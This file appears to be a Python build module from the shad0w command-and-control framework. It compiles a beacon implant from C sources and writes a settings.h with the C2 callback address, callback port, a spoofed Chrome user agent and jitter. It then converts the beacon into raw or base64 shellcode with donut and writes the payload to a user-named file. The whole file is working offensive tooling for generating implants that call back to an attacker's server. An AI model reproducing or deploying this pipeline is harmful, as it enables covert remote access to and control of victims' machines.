import os
import base64

from lib import shellcode

def clone_source_files(rootdir="src", builddir="build"):
    # move the source files of the beacon over
    # to the build directory

    # put us in the correct dir (this obviously needs to be inside docker)
    os.chdir("/root/shad0w/beacon")

    # why reinvent the wheel? lets jus use cp
    os.popen(f"cp {rootdir}/*.c {builddir}/")
    os.popen(f"cp {rootdir}/*.h {builddir}/")
    os.popen(f"cp {rootdir}/Makefile {builddir}/")

    return

def update_settings_file(shad0wbuild, custom_template=None, custom_path=None):
    # update the settings so that when we build
    # we will use our new args

    # this is hardcoded so will need docker
    if custom_path == None:
        settings_path = "/root/shad0w/beacon/build/settings.h"
    elif custom_path != None:
        settings_path = custom_path

    # make our settings.h file
    if custom_template == None:
        settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
    #define _C2_CALLBACK_PORT %s
    #define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"

    #define _CALLBACK_JITTER %s000""" % (shad0wbuild.address, shad0wbuild.port, shad0wbuild.jitter)

    elif custom_template is not None:
        settings_template = custom_template

    # and just write it
    with open(settings_path, 'w') as file:
        file.write(settings_template)
    
    return

def make_in_clone(builddir="/root/shad0w/beacon/build", modlocation="/root/shad0w/beacon/beacon.exe"):
    # build the beacon from the source files
    # held inside the build directory

    # we should already be here but this is just to make sure
    os.chdir(builddir)

    # and lets make
    os.popen("make").read()

    # check that our beacon was actually made
    try:
        open(modlocation, 'rb')
    except FileNotFoundError:
        print("ERROR: building module")
        return False
    
    return True

def extract_shellcode(beacon_file="/root/shad0w/beacon/beacon.exe", want_base64=False):
    # use donut to extract the shellcode from
    # our newly created beacon

    # use donut to get it
    if want_base64 is False:
        code = shellcode.generate(beacon_file, None, None, parse=False)
    
    elif want_base64 is True:
        code = base64.b64encode(shellcode.generate(beacon_file, None, None, parse=False)).decode()

    return code

def write_and_bridge(filename, rcode):
    # write the supplied code to the file given
    # by the user and then make sure they can access it

    # might change this?
    os.chdir("/root/shad0w/.bridge")

    # remove the old beacon file
    os.unlink("/root/shad0w/beacon/beacon.exe")

    with open(filename, 'wb') as file:
        file.write(rcode)
    
    print(f"wrote {len(rcode)} bytes to {filename}")